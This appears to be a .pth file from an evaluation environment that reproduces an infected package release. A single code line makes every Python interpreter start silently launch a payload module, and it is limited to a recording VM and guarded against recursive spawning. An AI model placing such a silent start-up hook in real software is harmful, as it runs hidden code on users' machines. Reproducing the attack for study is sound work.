# The infected release's addition, as the write-ups describe it (../../README.md): a line Python's site module runs at every interpreter start, which starts the payload as a Python of its own with no output. Two departures. It does nothing off a recording VM (the payload's own guard, in _start.py, also asks where the case's host resolves). And the Python it starts is marked so that its own start-up does not start another: the real one's did, without end, the bug that got it noticed.
import os, subprocess, sys; os.path.exists("/etc/tangent-eval-vm") and "ACME_TOKENS_STARTED" not in os.environ and subprocess.Popen([sys.executable, "-c", "import acme_tokens._start"], env={**os.environ, "ACME_TOKENS_STARTED": "1"}, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
